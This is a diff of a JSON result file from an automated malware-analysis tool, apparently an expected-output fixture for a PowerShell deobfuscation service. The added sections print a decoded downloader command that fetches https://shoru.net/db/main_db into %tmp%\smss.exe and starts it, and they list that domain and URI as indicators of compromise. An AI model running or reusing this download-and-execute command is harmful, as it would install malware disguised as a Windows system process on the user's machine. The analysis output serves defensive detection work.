@@ -1,8 +1,51 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 21,
+    "score": 22,
     "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[Invoke-WebRequest] Download from: -outf %tmp%\\\\smss.exe https://shoru.net/db/main_db\n\n[start] %tmp%\\\\smss.exe\n",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Actions detected with PSDecode",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"shoru.net\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://shoru.net/db/main_db\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/db/main_db\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "dynamic": {
+              "domain": [
+                "shoru.net"
+              ],
+              "uri": [
+                "https://shoru.net/db/main_db"
+              ],
+              "uri_path": [
+                "/db/main_db"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in actions",
+        "zeroize_on_tag_safe": false
+      },
       {
         "auto_collapse": false,
         "body": null,
@@ -12,6 +55,28 @@
         "heuristic": null,
         "tags": {},
         "title_text": "Suspicious Content Detected in 47f94fcb91818af71df8ab34b27e7dc7867c40c192cd1443a38ea44d69d8177a",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Marks: iwr, -outf",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "Downloader": 10
+          },
+          "signatures": {
+            "Downloader": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: Downloader",
         "zeroize_on_tag_safe": false
       },
       {
@@ -67,39 +132,6 @@
         },
         "title_text": "IOC(s) extracted from 47f94fcb91818af71df8ab34b27e7dc7867c40c192cd1443a38ea44d69d8177a",
         "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": null,
-        "body_format": "TEXT",
-        "classification": "TLP:W",
-        "depth": 0,
-        "heuristic": null,
-        "tags": {},
-        "title_text": "Suspicious Content Detected in layer_1.ps1",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "Marks: Invoke-WebRequest",
-        "body_format": "TEXT",
-        "classification": "TLP:W",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "Downloader": 10
-          },
-          "signatures": {
-            "Downloader": 1
-          }
-        },
-        "tags": {},
-        "title_text": "Signature: Downloader",
-        "zeroize_on_tag_safe": false
       }
     ]
   },
@@ -110,8 +142,8 @@
         "sha256": "37e0f95a86453f4ff227aa2d8403d3f0f2d2ceecb6dccf36e20bafbe09658a3d"
       },
       {
-        "name": "ba3d82d4da257da3f5802eaa917a1912025ef2100bf80dc2a09fa0e500833ea6",
-        "sha256": "ba3d82d4da257da3f5802eaa917a1912025ef2100bf80dc2a09fa0e500833ea6"
+        "name": "deobfuscated.ps1",
+        "sha256": "b09c958e1c8554297bf49b2bf134e567f151d011f562684375084f67424de190"
       }
     ],
     "supplementary": []
@@ -125,10 +157,8 @@
       },
       {
         "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "One Liner"
-        ]
+        "heur_id": 1,
+        "signatures": []
       },
       {
         "attack_ids": [],
@@ -136,9 +166,37 @@
         "signatures": [
           "Downloader"
         ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "One Liner"
+        ]
       }
     ],
     "tags": {
+      "network.dynamic.domain": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "shoru.net"
+        }
+      ],
+      "network.dynamic.uri": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "https://shoru.net/db/main_db"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/db/main_db"
+        }
+      ],
       "network.static.domain": [
         {
           "heur_id": 1,
